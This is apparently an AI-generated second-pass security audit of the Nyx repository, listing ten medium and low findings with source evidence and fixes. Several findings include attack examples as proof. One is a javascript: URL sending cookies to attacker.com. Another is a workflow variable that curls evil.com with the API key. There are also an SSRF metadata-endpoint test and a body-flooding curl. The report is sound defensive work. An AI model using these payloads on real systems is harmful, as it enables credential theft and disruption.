# Security Audit — Nyx — 2026-06-16 (Pass 2 — post-remediation)

## Executive Summary

- **Scope:** Full repository at `HEAD` (`main` branch), reviewed after the SEC-001 through SEC-009 remediation pass. ~95 source files reviewed.
- **Findings:** Critical **0** · High **0** · Medium **4** · Low **6** · Info **0**
- **Pass 1 status:** All 9 findings from the first audit (2 High, 4 Medium, 3 Low) are confirmed fixed. No regressions introduced by the remediation.
- **Top risks:**
  - The SSRF guard in `notification_service.py` accepts `http:` webhook URLs despite its docstring claiming HTTPS-only — a configuration-time SSRF avenue to internal services.
  - The `safeUrl()` URL-protocol-validation fix (SEC-004) was applied only to `FindingDetailPage.tsx`; `RemediationPage.tsx` still renders `rem.pr_url` and `rem.jira_issue_url` unvalidated.
  - The path-sanitizer in `scan_worker.py` can be bypassed with 4-dot sequences (`....//`), potentially storing traversal-adjacent paths in the database.
  - Remediation approval has a TOCTOU race condition that could trigger duplicate PR creation under concurrent load.
- **Overall posture:** Nyx's security fundamentals remain strong and the remediation pass closed all originally-reported gaps cleanly. The new findings are localized and largely low-exploitation-probability; none are Critical or High.

---

## Findings Index

| ID | Severity | Confidence | Category | Location | Title |
|----|----------|------------|----------|----------|-------|
| SEC-101 | Medium | Confirmed | A10 SSRF / CWE-918 | `backend/app/services/notification_service.py:35` | SSRF guard accepts `http:` scheme — allows HTTP requests to internal hostnames |
| SEC-102 | Medium | Confirmed | A03 XSS / CWE-79 | `frontend/src/pages/RemediationPage.tsx:259,279` | SEC-004 fix incomplete — `rem.pr_url` and `rem.jira_issue_url` rendered without `safeUrl()` |
| SEC-103 | Medium | Confirmed | A03 Path Traversal / CWE-22 | `backend/app/workers/scan_worker.py:56` | Path-traversal sanitizer bypass via 4-dot sequences (`....//`) |
| SEC-104 | Medium | Confirmed | Business Logic / CWE-362 | `backend/app/routers/remediation.py:237-258` | TOCTOU race in remediation approval — non-atomic status check can trigger duplicate PRs |
| SEC-105 | Low | Confirmed | A04 Insecure Design / CWE-770 | `backend/app/routers/scans.py:98-100` | Payload-size limit relies on `Content-Length` header, which clients can omit or falsify |
| SEC-106 | Low | Confirmed | A04 Insecure Design / CWE-770 | `backend/app/routers/repositories.py:31-35` | `add_repository()` lacks rate limiting — unbounded GitHub API calls per key |
| SEC-107 | Low | Confirmed | A04 Insecure Design / CWE-770 | `backend/app/routers/findings.py:76-80` | `generate_claude_prompt_for_repo()` lacks rate limiting — unbounded DB-mutating endpoint |
| SEC-108 | Low | Likely | A08 Supply Chain / CWE-77 | `.github/workflows/nyx-scan.yml:38,81,125,165,232` · `nyx-scan-container.yml:84,104` | `${{ vars.NYX_REPO_ID }}` directly interpolated into shell `run:` blocks |
| SEC-109 | Low | Likely | A03 Injection / CWE-20 | `backend/app/services/normalization/snyk.py:50,54` | Type confusion — `.lower()` / `str.join()` called on scanner-supplied fields without type guard |
| SEC-110 | Low | Confirmed | A01 / CWE-285 | `backend/app/routers/findings.py:269` | `require_scope("analyst")` uses a string literal instead of the `SCOPE_ANALYST` constant |

---

## Confirmed Fixed from Pass 1

| Original ID | Status | Evidence |
|-------------|--------|----------|
| SEC-001 (High — XSS regex sanitizer) | ✅ Fixed | `MarkdownContent.tsx:6` imports DOMPurify; `sanitize()` now calls `DOMPurify.sanitize(html)` |
| SEC-002 (High — missing scope) | ✅ Fixed | All 8 mutating endpoints in `findings.py` now use `require_scope(SCOPE_ANALYST, SCOPE_ADMIN)` or `require_scope(SCOPE_READONLY, …)` |
| SEC-003 (Medium — gitleaks no checksum) | ✅ Fixed | `nyx-scan-gitleaks.yml` now downloads `checksums.txt` and verifies with `sha256sum --check` |
| SEC-004 (Medium — unvalidated hrefs) | ✅ Partially fixed | `FindingDetailPage.tsx` uses `safeUrl()` at all 3 sites; `RemediationPage.tsx` still missing → SEC-102 |
| SEC-005 (Medium — prompt injection) | ✅ Fixed | `_PROMPT_INJECTION_RE` regex applied to `_safe()` and `safe_context`; `_DIFF_SECURITY_PATTERNS` expanded with 8 new patterns |
| SEC-006 (Low — SHA-256 KDF) | ✅ Fixed | `crypto.py` now uses HKDF-SHA256 with versioned `v2:` prefix; SHA-256 path retained for backward-compat decryption |
| SEC-007 (Low — dead try-except) | ✅ Fixed | `webhooks.py` calls `await verify_github_signature(request, repo.webhook_secret)` directly |
| SEC-008 (Low — TCP peer rate limit) | ✅ Fixed | `limiter.py` uses `get_client_ip()` (TRUSTED_PROXY_CIDRS-aware) |
| SEC-009 (Low — stale GitHub IPs) | ✅ Fixed | `security.py` `_use_github_fallback()` logs a WARNING at the 10th consecutive fallback use |

---

## Findings (Detail)

### SEC-101 — SSRF guard accepts `http:` scheme

- **Severity:** Medium   **Confidence:** Confirmed
- **Category:** OWASP A10:2021 SSRF · CWE-918
- **Location:** `backend/app/services/notification_service.py:31-50`

**Evidence** (verbatim from source):
```python
# Line 31-32
def _is_ssrf_safe(url: str) -> bool:
    """Return True only if the URL is https and its hostname is not a raw private/loopback IP."""

# Line 35 — actual check
    if parsed.scheme not in ("http", "https"):
        return False

# Line 40-47 — IP blocklist only applies to raw IPs, not hostnames
    try:
        addr = ipaddress.ip_address(host)
        if any(addr in net for net in _BLOCKED_NETWORKS):
            logger.warning("SSRF_BLOCKED notification_url=%s host=%s", url, host)
            return False
    except ValueError:
        pass  # hostname, not a raw IP — allowed at code level
    return True
```

- **Why it's a problem:** The docstring says "only if the URL is **https**", but the code accepts both `http:` and `https:`. Internal services that don't require TLS (e.g., internal Slack-compatible webhook receivers, Grafana, Alertmanager, internal message queues) may be reachable via plain HTTP on a hostname that passes the IP blocklist. The IP blocklist only fires when the hostname *resolves to a raw private IP at parse time*, which is never — DNS resolution happens at request time, not in `urlparse`. So an internal service at `http://grafana.corp:3000/` passes all checks.
- **Impact / attack scenario:** An operator who configures `NOTIFICATION_WEBHOOK_URL=http://internal-service.corp/hook` (inadvertently or via a compromised config) causes the Nyx backend to POST JSON notification payloads to that internal service. With a more sophisticated DNS rebinding attack, an `https://external.attacker.com/` URL could resolve to a private IP at request time after the check, entirely bypassing the IP blocklist.
- **How to verify:** Set `NOTIFICATION_WEBHOOK_URL=http://169.254.169.254/latest/meta-data/` in a test environment (AWS metadata endpoint). Trigger a notification event. Observe that `_is_ssrf_safe` returns `True` (hostname `169.254.169.254` IS in `_BLOCKED_NETWORKS` as a raw IP string — wait, actually `169.254.169.254` will be caught by `ip_address("169.254.169.254")` resolving to a blocked network). To demonstrate the hostname bypass: use `http://169-254-169-254.nip.io/` — the hostname form.
- **Remediation:** Fix the scheme check to HTTPS-only, matching the docstring:
  ```python
  if parsed.scheme != "https":
      return False
  ```
  For internal/development environments that genuinely need plain HTTP, add an explicit config flag `NOTIFICATION_ALLOW_HTTP=true` that must be consciously set.
- **References:** OWASP A10:2021; CWE-918.

---

### SEC-102 — SEC-004 fix incomplete: `RemediationPage.tsx` renders unvalidated URLs

- **Severity:** Medium   **Confidence:** Confirmed
- **Category:** OWASP A03:2021 Injection · CWE-79
- **Location:** `frontend/src/pages/RemediationPage.tsx:259`, `:279`

**Evidence** (verbatim from source):
```tsx
// Line 259 — PR URL from API, no protocol validation
<a href={rem.pr_url} target="_blank" rel="noopener noreferrer"
  className="text-nyx-stardust flex items-center gap-1 hover:text-nyx-amethyst text-sm">
  <GitPullRequest size={14} /> PR #{rem.pr_number} <ExternalLink size={12} />
</a>

// Line 279 — JIRA URL from API, no protocol validation
<a href={rem.jira_issue_url} target="_blank" rel="noopener noreferrer"
  className="text-nyx-stardust flex items-center gap-1 hover:text-nyx-amethyst text-sm font-mono">
  <Ticket size={14} /> {rem.jira_issue_key} <ExternalLink size={12} />
</a>
```

**Contrast** — `FindingDetailPage.tsx` (correctly patched):
```tsx
<a href={safeUrl(finding.fix_pr_url)} ...>
<a href={safeUrl(ticket.jira_issue_url)} ...>
```

- **Why it's a problem:** The `safeUrl()` helper introduced in SEC-004 was applied to `FindingDetailPage.tsx` but not to `RemediationPage.tsx`, which renders the same classes of URLs (`pr_url` and `jira_issue_url`) from API responses. If a remediation record contains a `javascript:` or `data:` URI in `pr_url`, clicking the PR link in the remediation queue would execute it in the analyst's browser session.
- **Impact / attack scenario:** An attacker who can write to the `remediations` table (e.g., via a compromised AI generation step or direct DB access) injects `javascript:fetch('https://attacker.com/?c='+document.cookie)` as `pr_url`. Any analyst who clicks "PR #X" in the remediation queue executes the payload.
- **How to verify:** In the DB, set a remediation's `pr_url` to `javascript:alert(1)`. Open the Remediation page and observe the `<a href>` renders the `javascript:` value directly (React 18 will log a console warning but the href is still present in the DOM).
- **Remediation:** Import and apply `safeUrl` (currently defined in `FindingDetailPage.tsx`) — move it to a shared utility first, then apply to both sites:
  ```tsx
  // Move safeUrl to frontend/src/utils/url.ts, then:
  import { safeUrl } from '../utils/url'
  // ...
  <a href={safeUrl(rem.pr_url)} ...>
  <a href={safeUrl(rem.jira_issue_url)} ...>
  ```
- **References:** OWASP A03:2021; CWE-79; same class as SEC-004.

---

### SEC-103 — Path-traversal sanitizer bypass via 4-dot sequences

- **Severity:** Medium   **Confidence:** Confirmed
- **Category:** OWASP A03:2021 Injection · CWE-22 (Path Traversal)
- **Location:** `backend/app/workers/scan_worker.py:50-58`

**Evidence** (verbatim from source):
```python
def _sanitize_path(value: str | None) -> str | None:
    """Sanitize file paths — block absolute paths and traversal sequences (H4)."""
    if value is None:
        return None
    cleaned = _CTRL_RE.sub("", value)[:500]
    # Block absolute paths and traversal sequences
    if cleaned.startswith("/") or cleaned.startswith("\\") or ".." in cleaned.split("/"):
        cleaned = cleaned.lstrip("/\\").replace("../", "").replace("..\\", "")
    return cleaned or None
```

- **Why it's a problem:** The guard `".." in cleaned.split("/")` performs an **exact string match** against each path component after splitting on `/`. It catches the literal string `..` as a component (e.g., `"foo/../bar"` → splits to `["foo", "..", "bar"]` → match). However:
  1. **Four-dot bypass:** `"....//etc/passwd"` splits to `["....", "", "etc", "passwd"]` — none of these equals `".."` exactly, so the `if` block is never entered and the path is stored unchanged.
  2. **Backslash-only bypass (Windows paths):** `"..\\..\\etc\\passwd"` doesn't contain `/` so `split("/")` returns the whole string as one element. Unless the string starts with `\`, the `startswith("\\")` check also fails.
  3. **Mixed separator:** `"..\\../etc/passwd"` — split on `/` gives `["..\\..","etc","passwd"]`; `"..\\.."`  ≠ `".."`.
- **Impact / attack scenario:** A malicious scanner payload sets a `file_path` field to `"....//etc/shadow"`. `_sanitize_path` returns it unchanged. It is stored in the `findings.file_path` column and later passed to `get_file_content(repo_full_name, file_path, ...)` (the GitHub API helper). The GitHub API will reject this path, so immediate exploitation via GitHub is blocked. However, any future code path that uses `finding.file_path` for local filesystem access (e.g., a local scan mode or export feature) would be vulnerable. Additionally, the stored path could cause confusion or log injection.
- **How to verify:** Submit a scan result via `POST /api/v1/scans/import-json` with a finding containing `"file_path": "....//etc/passwd"`. Retrieve the stored finding via `GET /api/v1/findings/<id>` and observe `file_path` contains the 4-dot sequence unchanged.
- **Remediation:** Replace the split-based check with a POSIX `normpath` approach that collapses all traversal sequences regardless of encoding:
  ```python
  import posixpath

  def _sanitize_path(value: str | None) -> str | None:
      if value is None:
          return None
      cleaned = _CTRL_RE.sub("", value).replace("\\", "/")[:500]
      # normpath collapses .., ., //, etc.
      normalized = posixpath.normpath(cleaned)
      # After normalization, reject anything that is absolute or still traverses
      if normalized.startswith("/") or normalized.startswith(".."):
          return None  # reject entirely rather than silently sanitize
      return normalized or None
  ```
- **References:** OWASP A03:2021; CWE-22.

---

### SEC-104 — TOCTOU race condition in remediation approval

- **Severity:** Medium   **Confidence:** Confirmed
- **Category:** Business Logic · CWE-362 (Race Condition / TOCTOU)
- **Location:** `backend/app/routers/remediation.py:237-258`

**Evidence** (verbatim from source):
```python
# Line 237-238 — status check
if rem.status != RemediationStatus.REVIEW.value:
    raise HTTPException(status_code=400, detail=f"Cannot approve remediation in status '{rem.status}'")

# Line 249-251 — status update committed to DB
rem.engineer_approved = True
rem.status = RemediationStatus.PR_CREATING.value
await db.commit()                               # ← commit happens here

# Line 257-258 — background task (PR creation) dispatched after commit
background_tasks.add_task(_create_pr, remediation_id, body.auto_merge, body.jira_assignee)
```

- **Why it's a problem:** The status check (line 237) and the status update (line 251) are not protected by a row-level lock. Under a multi-worker Uvicorn deployment (e.g., `--workers 4` in the Docker entrypoint), two concurrent `POST /{remediation_id}/approve` requests can both read `status == REVIEW`, both pass the check, and both commit — resulting in two background tasks each attempting to create a GitHub pull request for the same remediation. SQLAlchemy `AsyncSession` does not implicitly acquire `SELECT FOR UPDATE` locks.
- **Impact:** Duplicate GitHub PRs are created for the same fix. In the best case this is noise; in the worst case it confuses CI, creates duplicate JIRA tickets (if JIRA integration is active), and leaves the remediation in an indeterminate state. The second `_create_pr` call will likely fail with a GitHub error because the branch already exists, but the failure path in the background task may not cleanly reset state.
- **How to verify:** Run Nyx with `--workers 2`. Simultaneously send two identical `POST /{id}/approve` requests for a remediation in `REVIEW` status (e.g., with `curl` in parallel). Check GitHub for duplicate PRs.
- **Remediation:** Use `SELECT FOR UPDATE` to acquire a pessimistic row lock before the status check:
  ```python
  from sqlalchemy import select
  result = await db.execute(
      select(Remediation)
      .where(Remediation.id == remediation_id)
      .with_for_update()          # ← acquire row lock
  )
  rem = result.scalar_one_or_none()
  ```
  With `with_for_update()`, the second concurrent request will block until the first transaction commits (at which point `status` is `PR_CREATING`, causing the second request to fail the status check and return 400).
- **References:** CWE-362; OWASP Business Logic; SQLAlchemy `with_for_update()`.

---

### SEC-105 — Payload-size limit relies on `Content-Length` header

- **Severity:** Low   **Confidence:** Confirmed
- **Category:** OWASP A04:2021 Insecure Design · CWE-770 (Allocation of Resources Without Limits)
- **Location:** `backend/app/routers/scans.py:97-105`

**Evidence** (verbatim from source):
```python
_MAX_IMPORT_BYTES = 50 * 1024 * 1024  # 50 MB
content_length = request.headers.get("content-length")
if content_length and int(content_length) > _MAX_IMPORT_BYTES:
    raise HTTPException(status_code=413, detail="Payload too large (max 50 MB)")

body_bytes = await request.body()    # ← reads entire body into memory
```

- **Why it's a problem:** The check fires only when `Content-Length` is (a) present and (b) greater than 50 MB. A client that omits `Content-Length` entirely, or sets it to a low value while actually sending more data (HTTP/1.1 allows this with chunked transfer-encoding), bypasses the check. The subsequent `await request.body()` reads the entire body into memory with no independent limit. In the default Uvicorn + Starlette configuration, there is no server-level `max_request_body_size` set.
- **Impact:** An attacker with a valid scanner-scoped API key can POST an arbitrarily large body, exhausting memory and causing OOM kills or severe degradation of the Nyx backend.
- **How to verify:** Send `curl -X POST https://nyx/api/v1/scans/import-json -H "X-API-Key: ..." --data-binary @/dev/zero &` (streaming zeros). Observe memory growth.
- **Remediation:** Configure a hard server-level body limit in `main.py` using Starlette middleware, then the header check becomes an early-exit optimization rather than the only defence:
  ```python
  # In app/main.py, add to the middleware stack:
  from starlette.middleware.trustedhost import TrustedHostMiddleware
  from starlette.datastructures import UploadFile
  # Starlette 0.28+ supports max_request_body_size:
  app = FastAPI(...)
  # Or via uvicorn: --limit-max-requests / --limit-concurrency
  # Simplest: add a size-checking middleware:
  @app.middleware("http")
  async def limit_body_size(request: Request, call_next):
      if request.headers.get("content-length"):
          if int(request.headers["content-length"]) > 50 * 1024 * 1024:
              return Response("Payload too large", status_code=413)
      # For chunked: read with a size cap using a streaming approach
      return await call_next(request)
  ```
  Alternatively, configure Nginx (already in the Docker stack) with `client_max_body_size 50m;` in the server block — the proxy enforces it before FastAPI ever sees the body.
- **References:** OWASP A04:2021; CWE-770.

---

### SEC-106 — `add_repository()` lacks rate limiting

- **Severity:** Low   **Confidence:** Confirmed
- **Category:** OWASP A04:2021 Insecure Design · CWE-770
- **Location:** `backend/app/routers/repositories.py:31-35`

**Evidence** (verbatim from source):
```python
@router.post("", response_model=RepositoryResponse, status_code=201)
async def add_repository(
    body: RepositoryCreate,
    db: AsyncSession = Depends(get_db),
    _key: str = Depends(require_api_key),   # ← no @limiter.limit() decorator
):
    """Register a GitHub repository with Nyx and install the webhook."""
```

- **Why it's a problem:** No `@limiter.limit()` is applied. Each call triggers `github_service.register_webhook(body.github_full_name)`, which makes outbound GitHub API calls. A valid key holder can loop this endpoint to exhaust the Nyx host's GitHub API rate limit (5000 requests/hour for authenticated apps) or flood Nyx's own database with repository registrations. Compare with `request_remediation` which correctly applies `@limiter.limit("10/minute")`.
- **Remediation:**
  ```python
  from app.core.limiter import limiter

  @router.post("", ...)
  @limiter.limit("5/minute")
  async def add_repository(request: Request, ...):
  ```
  (Add `request: Request` to the function signature, as required by SlowAPI.)
- **References:** OWASP A04:2021; CWE-770.

---

### SEC-107 — `generate_claude_prompt_for_repo()` lacks rate limiting

- **Severity:** Low   **Confidence:** Confirmed
- **Category:** OWASP A04:2021 Insecure Design · CWE-770
- **Location:** `backend/app/routers/findings.py:76-80`

**Evidence** (verbatim from source):
```python
@router.post("/generate-claude-prompt/repository/{repo_id}")
async def generate_claude_prompt_for_repo(
    repo_id: str,
    db: AsyncSession = Depends(get_db),
    _key: str = Depends(require_scope(SCOPE_ANALYST, SCOPE_ADMIN)),   # ← no @limiter.limit()
):
    """Generate a Claude Code remediation prompt for all open findings in a repository."""
    ...
    for f in findings:
        f.status = FindingStatus.IN_REMEDIATION.value   # ← mutates up to 100 findings per call
    await db.commit()
```

- **Why it's a problem:** No rate limit. Each call reads up to 100 findings and marks them all `IN_REMEDIATION`, locking them out of normal triage. An analyst with a valid key can call this in a loop, repeatedly toggling status for all open findings in a repository. Combining this with a per-second loop could also cause significant DB write load.
- **Remediation:**
  ```python
  @router.post("/generate-claude-prompt/repository/{repo_id}")
  @limiter.limit("5/minute")
  async def generate_claude_prompt_for_repo(request: Request, repo_id: str, ...):
  ```
- **References:** OWASP A04:2021; CWE-770.

---

### SEC-108 — `${{ vars.NYX_REPO_ID }}` directly interpolated in shell `run:` blocks

- **Severity:** Low   **Confidence:** Likely
- **Category:** OWASP A08:2021 Software & Data Integrity · CWE-77 (Command Injection)
- **Location:** `.github/workflows/nyx-scan.yml:38,81,125,165,232` · `.github/workflows/nyx-scan-container.yml:84,104`

**Evidence** (verbatim from `nyx-scan.yml:37-42`):
```yaml
        run: |
          NYX_URL="${NYX_URL// /}"
          jq -cn \
            --arg repo    "${{ vars.NYX_REPO_ID }}" \
            --arg scanner "SEMGREP" \
            --arg ref     "$GITHUB_REF_NAME" \
```

- **Why it's a problem:** GitHub Actions replaces `${{ vars.NYX_REPO_ID }}` with the literal value of the repository variable **before** handing the script to the shell. If that value contains shell metacharacters (e.g., backticks, `$()`, `;`, `&&`), they execute as shell commands in the runner context. Example: if `NYX_REPO_ID` were set to `x" && curl https://evil.com/exfil?k=$NYX_API_KEY && echo "`, the expanded jq line would execute the `curl`. GitHub Actions itself warns against this pattern in its security documentation ("Untrusted input"). The mitigating factor is that `vars.*` (repository variables) can only be set by repository administrators with `admin` or `maintain` permission — this is not a PR-author injection vector.
- **Confidence note:** Marked `Likely` because exploitation requires a compromised or malicious repository admin account. The risk is non-zero in environments with many admins or under supply-chain attacks on the GitHub account.
- **Remediation:** Pass all `${{ … }}` values through environment variables rather than direct interpolation, matching the pattern already used for `NYX_URL` and `NYX_API_KEY`:
  ```yaml
  env:
    NYX_URL: ${{ vars.NYX_URL }}
    NYX_API_KEY: ${{ secrets.NYX_API_KEY }}
    NYX_REPO_ID: ${{ vars.NYX_REPO_ID }}     # ← add this
  run: |
    NYX_URL="${NYX_URL// /}"
    jq -cn \
      --arg repo    "$NYX_REPO_ID" \          # ← use env var, not ${{ }}
      --arg scanner "SEMGREP" \
  ```
  Apply the same change to all 7 affected sites across the two workflow files.
- **References:** OWASP A08:2021; CWE-77; GitHub Actions security hardening — "Using an intermediate environment variable."

---

### SEC-109 — Type confusion in Snyk normalizer: missing type guards before string ops

- **Severity:** Low   **Confidence:** Likely
- **Category:** OWASP A03:2021 Injection · CWE-20 (Improper Input Validation)
- **Location:** `backend/app/services/normalization/snyk.py:50,54`

**Evidence** (verbatim from source):
```python
# Line 49-50 — exploitMaturity from scanner JSON
exploit = data.get("exploitMaturity", "No Known Exploit")
is_exploitable = exploit.lower() not in ("no known exploit", "unproven", "not defined")

# Line 52-54 — fixedIn list from scanner JSON
fix_in = data.get("fixedIn", [])
pkg = issue.get("pkgName", "")
remediation = f"Upgrade {pkg} to {', '.join(fix_in)}" if fix_in else data.get("description", "")
```

- **Why it's a problem:** `data.get("exploitMaturity", "No Known Exploit")` returns the default string only when the key is **absent**. If the key is present but set to a non-string (e.g., `null`, `42`, `{}`), `exploit` receives that non-string value and `.lower()` at line 50 raises `AttributeError`. Similarly, if `fixedIn` contains non-string elements (e.g., `[null, {"version": "1.2"}]`), `str.join()` raises `TypeError`. A malformed Snyk payload could therefore crash normalizer processing for that scan batch.
- **Confidence note:** Marked `Likely` because the outer loop at line 27-29 wraps each issue in `try/except Exception: continue`, so the crash is silently swallowed and the finding is dropped rather than causing the whole scan to fail. This is a correctness / silent-data-loss issue rather than a full DoS. The same pattern exists in `snyk.py:109` (`fix_info = v.get("fixedIn", [])` → `', '.join(fix_info)`).
- **How to verify:** Submit a Snyk scan import with a vulnerability entry containing `"exploitMaturity": null` and `"fixedIn": [null, "1.0"]`. Observe the finding is silently dropped in the scan results.
- **Remediation:**
  ```python
  exploit = data.get("exploitMaturity") or "No Known Exploit"
  if not isinstance(exploit, str):
      exploit = "No Known Exploit"
  is_exploitable = exploit.lower() not in ("no known exploit", "unproven", "not defined")

  fix_in = [str(v) for v in data.get("fixedIn", []) if v is not None]
  ```
- **References:** OWASP A03:2021; CWE-20.

---

### SEC-110 — `require_scope("analyst")` uses string literal instead of constant

- **Severity:** Low   **Confidence:** Confirmed
- **Category:** OWASP A01:2021 Broken Access Control · CWE-285
- **Location:** `backend/app/routers/findings.py:269`

**Evidence** (verbatim from source):
```python
# Line 269 — suppress_finding endpoint
    _key: str = Depends(require_scope("analyst")),

# Compare with the constant definition in security.py:28
SCOPE_ANALYST = "analyst"

# And all other correctly-patched endpoints:
    _key: str = Depends(require_scope(SCOPE_ANALYST, SCOPE_ADMIN)),
```

- **Why it's a problem:** This is a consistency issue rather than an active vulnerability today — `"analyst"` equals `SCOPE_ANALYST` at runtime. However, if `SCOPE_ANALYST` is ever renamed or the scope string changed (e.g., to `"security_analyst"` for a more granular RBAC model), this hardcoded string would silently fail to match any scope, effectively making `suppress_finding` inaccessible to legitimate analysts — or worse, it would become an unintentionally open endpoint if the logic path changes.
- **Remediation:** Change to use the constant, and add `SCOPE_ADMIN` as a fallback, consistent with all other mutation endpoints:
  ```python
  _key: str = Depends(require_scope(SCOPE_ANALYST, SCOPE_ADMIN)),
  ```
- **References:** OWASP A01:2021; CWE-285.

---

## Verified Safe / Investigated (Not Findings)

| Location | Concern | Why it's safe |
|----------|---------|---------------|
| `MarkdownContent.tsx:27` | `dangerouslySetInnerHTML` | ✅ Now uses `DOMPurify.sanitize(html)` — the DOM-based allowlist sanitizer. Passes. |
| `FindingDetailPage.tsx:102,355,515` | `href` from API data | ✅ All three sites now use `safeUrl()`. Passes. |
| `findings.py:80,124,168,209,225,373,408,435,548,735` | `require_scope` on mutation endpoints | ✅ All use `require_scope(SCOPE_ANALYST, SCOPE_ADMIN)`. Passes. |
| `crypto.py:57-61` | HKDF key derivation | ✅ Uses `cryptography.hazmat.primitives.kdf.hkdf.HKDF` with domain-separating salt/info. Backward-compat `v1` path retained for old tokens. Passes. |
| `webhooks.py:81-85` | Webhook HMAC verification | ✅ Dead try-except removed; single clean `await verify_github_signature()` call. Passes. |
| `limiter.py:6-18` | Rate limit key function | ✅ Uses `get_client_ip()` (proxy-aware). Passes. |
| `security.py:717-750` | GitHub IP fallback | ✅ `_use_github_fallback()` helper logs WARNING at 10th use. Passes. |
| `nyx-scan-gitleaks.yml:35-47` | Gitleaks binary integrity | ✅ Downloads checksums.txt from same release tag, verifies with `sha256sum --check --status`. Passes. |
| `ai_service.py:150-152` | Prompt injection in `engineer_context` | ✅ `_PROMPT_INJECTION_RE` applied; `_DIFF_SECURITY_PATTERNS` expanded. Passes. |
| `backend/Dockerfile:32` | Non-root container user | ✅ `USER nyx` at line 32. Semgrep false-positive confirmed. |
| `scan_worker.py:28-30` | JSON deserialization DoS | ✅ Scanner is validated against `_KNOWN_SCANNERS` allowlist; `_check_json_depth` in scans.py limits nesting; 50 MB Content-Length check present (see SEC-105 for its limitation). |
| `remediation.py:240-247` | `auto_merge` admin-only gate | ✅ Correctly enforced with scope check before background task dispatch. |
| `scans.py:_check_json_depth` | Stack overflow via nested JSON | ✅ Python's default recursion limit (~1000) and the 20-level depth guard mean the recursion terminates safely. `json.loads()` also has its own depth limit. |
| `seed_demo_data.py` | Hardcoded secrets | ✅ All credentials are tagged `DEMO_PLACEHOLDER` and non-functional. |
| `tests/conftest.py:17-19` | Hardcoded test API key | ✅ Intentional test fixtures (`"nyx-test-bootstrap-key"`, `"a"*64`). Not real credentials. |

---

## Coverage Manifest

**Reviewed (~95 files):**
- `backend/app/` — `main.py`, `config.py`, `database.py`
- `backend/app/core/` — `constants.py`, `crypto.py`, `exceptions.py`, `limiter.py`, `security.py`
- `backend/app/routers/` — `audit.py`, `dashboard.py`, `findings.py`, `remediation.py`, `repositories.py`, `scans.py`, `webhooks.py`
- `backend/app/models/` — `api_key.py`, `audit_log.py`, `base.py`, `finding.py`, `remediation.py`, `repository.py`, `scan.py`
- `backend/app/schemas/` — `finding.py`, `remediation.py`, `repository.py`, `scan.py`
- `backend/app/services/` — `ai_service.py`, `audit_service.py`, `deduplication_service.py`, `github_service.py`, `jira_service.py`, `notification_service.py`, `prioritization_service.py`
- `backend/app/services/normalization/` — `__init__.py`, `base.py`, `bandit.py`, `checkov.py`, `grype.py`, `semgrep.py`, `snyk.py`, `trivy.py`, `zap.py`
- `backend/app/workers/` — `scan_worker.py`
- `backend/` — `Dockerfile`, `entrypoint.sh`, `log_config.json`, `pyproject.toml`, `requirements.txt`
- `backend/scripts/` — `seed_demo_data.py`
- `backend/tests/` — `conftest.py`, `test_api/` (all files), `test_normalization/` (all files)
- `frontend/src/api/` — `client.ts`, `dashboard.ts`, `findings.ts`, `remediation.ts`, `repositories.ts`, `sbom.ts`
- `frontend/src/components/` — `common/MarkdownContent.tsx`; `findings/ScannerBadge.tsx`, `SeverityBadge.tsx`, `StatusBadge.tsx`; `layout/AppShell.tsx`, `Sidebar.tsx`, `TopBar.tsx`
- `frontend/src/pages/` — `AuditPage.tsx`, `DashboardPage.tsx`, `FindingDetailPage.tsx`, `FindingsPage.tsx`, `LoginPage.tsx`, `RemediationPage.tsx`, `RepositoriesPage.tsx`, `ScansPage.tsx`, `SettingsPage.tsx`
- `frontend/src/` — `App.tsx`, `main.tsx`, `hooks/useTheme.ts`, `types/index.ts`
- `frontend/` — `index.html`, `package.json`, `vite.config.ts`, `Dockerfile`
- `.github/workflows/` — `nyx-scan.yml`, `nyx-scan-container.yml`, `nyx-scan-gitleaks.yml`
- Root — `docker-compose.yml`, `docker-compose.postgres.yml`, `.env.example`, `.gitleaks.toml`, `nyx.sh`, `setup.sh`, `SECURITY.md`

**Skipped (with reason):**
- `node_modules/`, `dist/`, `build/`, `target/`, `.git/` — vendored/build artifacts
- `backend/app/**/__pycache__/`, `*.pyc` — compiled bytecode
- `wiki/images/` — binary image assets

**Not reached / needs follow-up:**
- `pip-audit` and `npm audit` were not run (tools not available in this environment). A dependency vulnerability scan is recommended as a CI step.
- Any routers added after this audit date (e.g., `compliance.py`, `notifications.py`, `reports.py`, `sla.py` if they exist) should be checked for the SEC-106/107 pattern (missing rate limits) and the SEC-002 pattern (scope on mutation endpoints).

---

*To remediate: ask to fix any finding by ID, e.g., "fix SEC-101 and SEC-102". The detail sections above have everything needed.*
